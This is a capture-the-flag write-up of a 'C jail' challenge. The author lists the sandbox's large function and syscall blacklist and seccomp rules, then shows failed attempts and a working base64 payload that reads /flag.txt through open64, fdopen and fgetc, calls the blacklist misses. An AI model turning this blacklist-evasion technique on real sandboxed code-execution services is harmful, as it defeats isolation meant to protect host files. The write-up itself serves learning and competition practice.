Author: aimardcr

no it's not cyber jawara, it's c jail.

## Solution

C jail is interesting, never done this before xd.
There are 3 files given, `app.py`, `Dockerfile`, and `flag.txt`.
The docker execute `app.py` on connection,
with flag on `/flag.txt`.
Summary of `app.py`:

- One hell of an extensive blacklist.
- Input C code in base64.
- C code length must be less than 512.
- At most one `#define`.
- No inline assembly (use regex).
- Limited privileges (`prctl(PR_SET_NO_NEW_PRIVS)`).
- Seccomp context for suicide on illegalized syscall:
  - Process (`execve`, `fork`, `ptrace`),
  - Network (`socket`, `connect`, `accept`, `accept4`, `bind`, `listen`)
  - Memory (`mmap`, `mprotect`)
  - File (`read`, `readat`)
- Compile with `gcc -lseccomp`.
- Run it.

It also use `latin1` encoding but that doesn't matter anyway.
Gotta find a way out, so be *creative*.

Well, let's see, funcs for reading files...
Most are banned.
I'll just list all blacklist,
in case anyone is curious.

```py
BLACKLIST = [
    # I/O Operations
    "open", "openat", "fopen", "fopen64", "freopen", "freopen64",
    "read", "pread", "readv", "preadv", "write", "pwrite", "writev", "pwritev",
    "fgets", "fgetws", "fread", "fwrite", "fscanf", "fwscanf", "scanf", "wscanf",
    "sscanf", "swscanf", "getline", "getdelim", "fread_unlocked", "fwrite_unlocked",
    "getchar", "putchar", "getwc", "putwc", "memcpy", "strcpy", "strncpy", "strcat",
    "strncat", "sprintf", "snprintf", "truncate", "ftruncate", "chdir", "mkdir",
    "rmdir", "readdir", "link", "symlink", "readlink", "mknod",
    "fdatasync", "sync", "rename", "renameat", "renameat2",
    "fallocate", "posix_fadvise", "readlinkat", "faccessat", "faccessat2",
    "sendfile", "splice", "tee", "vmsplice", "copy_file_range",
    "preadv", "pwritev", "preadv2", "pwritev2",
    "statx", "name_to_handle_at", "open_by_handle_at",
    "openat2", "close_range",
    "nftw", "ftw",
    
    # Process Management
    "fork", "vfork", "execve", "execvp", "execv", "execle", "clone", "clone3",
    "setsid", "setpgid", "setpgrp", "kill", "wait", "waitpid", "waitid",
    "prlimit", "prlimit64",
    "sched_setscheduler", "sched_setparam", "setresuid", "setreuid", "setresgid",
    "setregid", "setrlimit", "getrlimit", "getpid", "getppid", "getuid", "geteuid",
    "getgid", "getegid", "sysinfo", "uname", "ptrace", "popen", "killpg",
    "prctl", "nice", "setpriority", "sched_yield", "sched_get_priority_max",
    "sched_get_priority_min", "sched_rr_get_interval",
    "sched_setaffinity", "sched_getaffinity", "sched_setscheduler", "sched_getscheduler",
    "sched_setparam", "sched_getparam",
    "getrusage", "times", "getitimer", "setitimer",
    "exit_group", "set_tid_address", "gettid",
    "sched_setattr", "sched_getattr",
    "pidfd_open", "pidfd_send_signal", "pidfd_getfd", "process_mrelease",
    "execveat",
    
    # Memory Management
    "mmap", "mprotect", "munmap", "brk", "sbrk", "mlock", "munlock", "madvise",
    "shmat", "shmdt", "shmctl", "shmget", "semctl", "semget", "semop",
    "remap_file_pages", "mremap", "mincore", "mlock2",
    "pkey_mprotect", "pkey_alloc", "pkey_free",
    "mbind", "set_mempolicy", "get_mempolicy", "migrate_pages",
    "process_madvise", "userfaultfd", "membarrier",
    "process_vm_readv", "process_vm_writev",
    
    # Network and IPC
    "socket", "bind", "listen", "accept", "connect", "send", "recv", "sendto",
    "recvfrom", "sendmsg", "recvmsg", "getsockopt", "setsockopt", "ioctl",
    "epoll_ctl", "epoll_wait", "eventfd", "socketpair", "mkfifo",
    "sethostname", "setdomainname", "gethostname", "getdomainname",
    "msgget", "msgsnd", "msgrcv", "msgctl",
    "accept4", "recvmmsg", "sendmmsg", "ethernet_multicast_join", "ethernet_multicast_leave",
    
    # System Calls and Kernel Interfaces
    "syscall", "io_submit", "io_getevents", "syslog", "system",
    "seccomp_init", "seccomp_rule_add", "seccomp_load", "seccomp_release",
    "sysctl", "sysfs",
    "reboot", "acct", "iopl", "ioperm", "modify_ldt", "create_module",
    "get_kernel_syms", "query_module", "nfsservctl", "getpmsg", "putpmsg",
    "afs_syscall", "tuxcall", "security",
    "init_module", "finit_module", "delete_module",
    "kexec_load", "kexec_file_load",
    "bpf", "perf_event_open",
    
    # File Descriptors and I/O
    "dup", "dup2", "dup3", "fcntl", "fileno", "flock", "lseek",
    "pread64", "pwrite64", "readahead", "sync_file_range",
    "io_setup", "io_destroy", "io_submit", "io_cancel", "io_getevents",
    "epoll_create1", "timerfd_create", "timerfd_settime", "timerfd_gettime",
    "io_uring_setup", "io_uring_enter", "io_uring_register",
    
    # Environment and Security
    "setenv", "unsetenv", "putenv", "getenv", "chroot",
    "capset", "capget",
    "seccomp",
    "cap_get_proc", "cap_set_proc", "cap_from_text", "cap_to_text",
    "security_getenforce", "security_setenforce",
    
    # Signal Handling
    "signal", "sigaction", "sigprocmask", "sigpending", "sigsuspend",
    "tgkill", "tkill", "sigqueue", "sigtimedwait", "sigwaitinfo",
    "rt_sigaction", "rt_sigprocmask", "rt_sigpending", "rt_sigsuspend", "rt_sigtimedwait",
    "rt_sigqueueinfo", "rt_tgsigqueueinfo",
    "sigaltstack", "rt_sigreturn",
    
    # User and Group Management
    "setuid", "setgid", "seteuid", "setegid", "setgroups", "getgroups",
    "setresuid", "setresgid", "setregid", "initgroups", "getresuid", "getresgid",
    
    # Dynamic Loading
    "dlopen", "dlsym", "dlclose", "dlerror", "dlinfo",
    
    # Time-related functions
    "settimeofday", "adjtimex", "clock_settime", "clock_gettime", "clock_getres",
    "clock_nanosleep", "timer_create", "timer_settime", "timer_gettime", "timer_delete",
    "timer_getoverrun",
    
    # Namespace manipulation
    "unshare", "setns",
    
    # Audit system
    "audit_write", "audit_read",
    
    # Extended attributes
    "setxattr", "lsetxattr", "fsetxattr", "getxattr", "lgetxattr", "fgetxattr",
    "listxattr", "llistxattr", "flistxattr", "removexattr", "lremovexattr", "fremovexattr",
    
    # File system operations
    "mount", "umount", "umount2", "pivot_root", "swapon", "swapoff",
    "syncfs", "fsmount", "fsopen", "fsconfig", "fspick",
    "open_tree", "move_mount",
    
    # Tracing and debugging
    "strace", "ltrace",
    
    # Asynchronous I/O
    "aio_read", "aio_write", "lio_listio",
    
    # Shared memory
    "shm_open", "shm_unlink",
    
    # Message queues
    "mq_open", "mq_close", "mq_unlink", "mq_send", "mq_receive", "mq_getattr", "mq_setattr",
    "mq_notify", "mq_timedreceive", "mq_timedsend",
    
    # Keyring functions
    "add_key", "request_key", "keyctl",
    
    # Filesystem quotas
    "quotactl", "quotactl_fd",
    
    # Lightweight process (thread) operations
    "set_robust_list", "get_robust_list", "futex", "futex_waitv", "futex_wake",
    
    # Virtualization-related calls
    "kvm", "vfio",
    
    # Extended Berkeley Packet Filter (eBPF) related
    "bpf_map_create", "bpf_map_lookup_elem", "bpf_map_update_elem", "bpf_map_delete_elem",
    "bpf_prog_load", "bpf_object__open", "bpf_object__load",
    
    # Newer IPC mechanisms
    "memfd_create", "memfd_secret",
    
    # File change monitoring
    "inotify_init", "inotify_add_watch", "inotify_rm_watch", "fanotify_init", "fanotify_mark",
    
    # Miscellaneous
    "getcpu", "kcmp", "getrandom",
    "rseq", "io_pgetevents",
    "cgroup_init", "cgroup_create_cgroup", "cgroup_delete_cgroup",
    "gethostbyname", "gethostbyaddr", "gethostbyname2", "getservbyname", "getservbyport",
    "getprotobyname", "getprotobynumber", "getnetbyname", "getnetbyaddr",
    "cachestat", "fchmodat2", "map_shadow_stack",
    
    # Container and namespace related
    "mount_setattr",
    
    # Landlock LSM
    "landlock_create_ruleset", "landlock_add_rule", "landlock_restrict_self",
    
    # Memory policy
    "set_mempolicy_home_node",
    
    # Architecture-specific calls (x86)
    "vm86"
]
```

I'm sorry, that was a lot :p  
I thought about func ptr trick with `#define`,
but that'll be hard.

Yeah, as per usual,
just fuck around till you see what works and not.
I do some small testing first and found that `printf` ain't banned!  
Attempts:

```c
char buf[1024];
int fd = open64("/flag.txt", O_RDONLY);
// read blacklisted
read(fd, buffer, 1024, 0);
printf("flag: %s\n", buffer);
close(fd);

int fd = open64("/flag.txt", O_RDONLY);
// dup2 blacklisted
dup2(fd, 0);
scanf("%1023s", buf);
printf("flag: %s\n", buf);
close(fd);

int fd = open64("/flag.txt", O_RDONLY);
// fnctl blacklisted
fcntl(fd, F_DUPFD, 1);
write(1, "flag: ", 6);
write(1, (void*)fd, 1024);
close(fd);
```

I look [around](https://github.com/NotSurprised/RingZer0-CTF-Writeup/blob/master/JailEscaping/C%20Jail/C%20Jail%202/Level%202.md),
here I noticed that `open64` is not banned too!

```c
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdio.h>
int fd = open64("/flag.txt", O_RDONLY);
// does nothing; prob terminate
dprintf(1, "%s\n", (char*)fd);
close(fd);

#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdio.h>
int fd = open64("/flag.txt", O_RDONLY);
char buf[1024];
// does nothing; prob terminate
fprintf(buf, "%s\n", (char*)fd);
printf("%s\n", buf);
close(fd);

#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdio.h>
int fd = open64("/flag.txt", O_RDONLY);
FILE *f;                  
f = fdopen(fd, "r");
int c;                                       
// fgets is banned but fgetc isn't
while((c = fgetc(f)) != EOF) printf("%c", c);
close(fd);
```

On last payload I got troubles on `FILE *f = fdopen(fd, "r");`,
cuz the stuupid CParser is not supportive (like dad & mom),
but I just need to define and init at separate line lol smh.

```
Enter C code (in base64): I2luY2x1ZGUgPHN5cy90eXBlcy5oPgojaW5jbHVkZSA8c3lzL3N0YXQuaD4KI2luY2x1ZGUgPGZjbnRsLmg+CiNpbmNsdWRlIDxzdGRpby5oPgppbnQgZmQgPSBvcGVuNjQoIi9mbGFnLnR4dCIsIE9fUkRPTkxZKTsKRklMRSAqZjsKZiA9IGZkb3BlbihmZCwgInIiKTsKaW50IGM7CndoaWxlKChjID0gZmdldGMoZikpICE9IEVPRikgcHJpbnRmKCIlYyIsIGMpOwpjbG9zZShmZCk7Cg==

/tmp/0f580b5a13045994904ef93329e4531f.c: In function ârunâ:
/tmp/0f580b5a13045994904ef93329e4531f.c:58:10: warning: implicit declaration of function âopen64â; did you mean âopenatâ? [-Wimplicit-function-declaration]
   58 | int fd = open64("/flag.txt", O_RDONLY);
      |          ^~~~~~
      |          openat
REDACTEDEnter C code (in base64):
```

omg let's goo hell yeaa.
Now let's just do this on the instance.

```
$ nc playground.tcp1p.team 32779
Enter C code (in base64): I2luY2x1ZGUgPHN5cy90eXBlcy5oPgojaW5jbHVkZSA8c3lzL3N0YXQuaD4KI2luY2x1ZGUgPGZjbnRsLmg+CiNpbmNsdWRlIDxzdGRpby5oPgppbnQgZmQgPSBvcGVuNjQoIi9mbGFnLnR4dCIsIE9fUkRPTkxZKTsKRklMRSAqZjsKZiA9IGZkb3BlbihmZCwgInIiKTsKaW50IGM7CndoaWxlKChjID0gZmdldGMoZikpICE9IEVPRikgcHJpbnRmKCIlYyIsIGMpOwpjbG9zZShmZCk7Cg==

/tmp/0f580b5a13045994904ef93329e4531f.c: In function ârunâ:
/tmp/0f580b5a13045994904ef93329e4531f.c:58:10: warning: implicit declaration of function âopen64â; did you mean âopenatâ? [-Wimplicit-function-declaration]
   58 | int fd = open64("/flag.txt", O_RDONLY);
      |          ^~~~~~
      |          openat
INTECHFEST{AST-P4rs3r_C0nfus1on_is_a_R3al_Th1nG}
```

yayy flaagg!! :DD
